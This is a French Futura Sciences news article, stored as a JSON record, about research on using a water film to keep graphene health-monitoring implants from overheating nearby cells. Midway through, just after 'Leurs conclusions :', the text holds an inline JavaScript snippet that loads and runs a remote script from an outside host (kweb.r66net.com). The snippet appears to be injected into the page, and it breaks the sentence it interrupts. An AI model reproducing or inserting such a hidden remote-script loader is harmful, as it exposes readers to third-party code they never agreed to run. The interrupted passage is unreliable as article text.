{"title": "Du graphene pour veiller sur notre sante", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-06-04", "content": "Souvent decrit comme un materiau miracle, le graphene est cense changer notre futur, ou au moins celui de l'electronique. Grace aux travaux d'une equipe americano-chinoise, cette feuille de carbone pourrait meme entrer dans la legende en constituant la structure des implants qui, nous promet-on, surveilleront un jour notre sante. Article initial paru le 29 septembre 2016 Lorsqu'il est question d' implants  a base de  graphene , l'innocuite de ce  materiau  (une feuille monoatomique de  carbone ) pose probleme. Non seulement la preuve de sa non-toxicite n'a pas encore ete apportee, mais en plus, le  graphene , si miracle soit-il, presente une facheuse tendance a la surchauffe. Selon des chercheurs du  MIT  ( Massachusetts Institute of Technology ) et de l'universite Tsinghua, de Pekin, ce defaut pourrait etre contre grace a une simple  pellicule d'eau . Surveiller notre  etat de sante  a l'aide d'implants capables d'emettre une alerte devant les signes d'une potentielle defaillance est l'objectif a moyen terme de la medecine predictive. Et si dans ce domaine aussi, les chercheurs s'interessent au graphene, c'est pour sa polyvalence. On peut en effet imaginer que chacune de ses caracteristiques puisse etre exploitee pour une mesure en particulier. Malheureusement, le courant necessaire pour alimenter un implant en graphene risquerait de faire chauffer le systeme et... de faire cuire les  tissus humains  environnants. C'est, en premier lieu, ce que confirme effectivement l'etude des ingenieurs du MIT et de l'universite Tsinghua : un contact direct entre une couche de graphene et la membrane d'une cellule peut rapidement mener a la mort de cette derniere.  << Dans le corps humain, l'eau est partout. La surface externe des  membranes cellulaires  est meme en perpetuelle interaction avec l'eau, de telle sorte qu'il est difficile de la supprimer totalement. Nous avons donc eu l'idee de jouer avec cette eau et nous avons concu un modele en sandwich [dans lequel la membrane et le graphene jouent le role des tranches de pain alors que l'eau joue celui du jambon,  NDLR ] qui ameliore la  conductance  thermique du systeme >> , explique Zhao Qin, chercheur au MIT. Image de synthese representant la structure du graphene sous une pellicule d'eau, le systeme imagine par des ingenieurs du MIT et de l'universite Tsinghua pour concevoir de futurs implants de medecine predictive. (c) Zhao Qin, MIT                               Un peu d'eau pour soutenir les implants en graphene Ces chercheurs ont donc etudie avec precision, sur une surface de 500  nanometres  carres, la maniere dont la  chaleur  est transmise, a l'echelle atomique, entre du graphene et des tissus biologiques separes uniquement par une fine pellicule d'eau. Ils ont observe les  echanges de chaleur  en fonction du courant applique et de l'epaisseur de la pellicule d'eau. Leurs conclusions :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La puissance maximale qui peut etre appliquee est de l'ordre de 1 megawatt par metre carre sous la forme d'impulsions d'une microseconde environ. Une epaisseur d'eau de 1 nanometre suffit a dissiper efficacement la chaleur generee. Par quel mecanisme ? Peut-etre grace a un phenomene surprenant que l'equipe sino-americaine a mis en evidence. L'eau prise entre le graphene et la membrane cellulaire a tendance a adopter une  structure cristalline  semblable a celle du graphene et a se comporter un peu comme un  solide . En s'appuyant sur ces travaux, il devrait un jour etre possible de concevoir des implants a base de graphene qui ne menaceraient plus de griller les cellules avoisinantes. Ou bien d'ameliorer le fonctionnement de certaines  applications  qui, au contraire, sont destinees a mettre a mort des tissus biologiques, comme les  tumeurs cancereuses , par exemple. Un implant revolutionnaire pour eviter la maladie d'Alzheimer                       La maladie d'Alzheimer attaque progressivement les neurones, provoquant tout d'abord des troubles de la memoire jusqu'a la perte des fonctions autonomes puis la mort. Des chercheurs de l'EPFL (Ecole Polytechnique Federale de Lausanne), en Suisse, ont developpe une capsule qui pourrait proteger les neurones et enrayer la maladie. Voici son fonctionnement presente en video.                                       ", "theme": "sante"}